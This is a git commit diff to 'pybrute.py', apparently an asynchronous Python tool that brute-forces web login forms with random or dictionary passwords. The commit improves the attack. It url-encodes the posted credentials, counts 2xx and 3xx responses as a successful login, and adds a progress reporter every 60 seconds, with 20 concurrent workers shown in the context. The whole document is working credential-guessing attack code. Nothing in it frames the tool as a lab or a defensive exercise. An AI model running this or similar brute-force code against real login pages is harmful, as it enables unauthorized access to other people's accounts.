b99fded0abee7faeadf19b862169ab830d24ad89
gemmyfellow <171301123+gemmyfellow@users.noreply.github.com.>
2024-05-31 12:49:58 +0200

    Fixed password checking
    - Made sure passwords that are correct are marked as correct
    - post data is now properly url-encoded
    - added a status checker to report how many passwords have been tried
      every 60 secs

--- pybrute.py
+++ pybrute.py
@@ -5,6 +5,7 @@ import aiohttp
 import asyncio
 import os
 import random
+import datetime
 
 BAD_PASS_FILEPATH= "bad_passwords.txt"
 
@@ -26,7 +27,7 @@ found_password = ""
 
 def generate_password():
     while True: 
-        attempt = "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_-+=[]\{\}\'\".</:;\\| ,?",k=random.randint(6,22)))
+        attempt = "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_-+=[]{}\'\".</:;\\| ,?",k=random.randint(6,22)))
         if attempt not in bad_passwords:
             return attempt 
 
@@ -38,15 +39,16 @@ def get_bad_passwords():
 
 async def send_login_attempt(url, username, password):
     async with aiohttp.ClientSession() as session:
-        async with session.post(url=url,headers={"Content-Type":"application/x-www-form-urlencoded"}, data=f"user={username}&pass={password}&gobu=Log+In") as response:
+        formdata = aiohttp.FormData({"user":username, "pass":password})
+        async with session.post(allow_redirects=False,url=url,headers={"Content-Type":"application/x-www-form-urlencoded"}, data=formdata) as response:
 
             
             status =  response.status
-            if status == 200:
+            if 200 <= status < 400 :
                 # success
                 global found, found_password
                 found = True
-                print("found succesful password", password, "!")
+                print("found succesful password:", password)
                 found_password = password
             else:
                 async with bad_pass_lock:
@@ -74,9 +76,16 @@ async def brute_force_worker(username,url):
         await send_login_attempt(url, username, password)
         password = generate_password();
 
+async def check_status():
+    while not found:
+        await asyncio.sleep(60)
+
+        async with bad_pass_lock:
+            print(f"tested {len(bad_passwords)} at {datetime.datetime.now().strftime("%H:%M:%S")}")
 
 
 async def main():
+    asyncio.create_task(check_status())
     if namespace.dictfile:
         with  open(namespace.dictfile) as dictfile:
             workers = [dict_worker( namespace.target, namespace.url, dictfile) for i in range(20)]
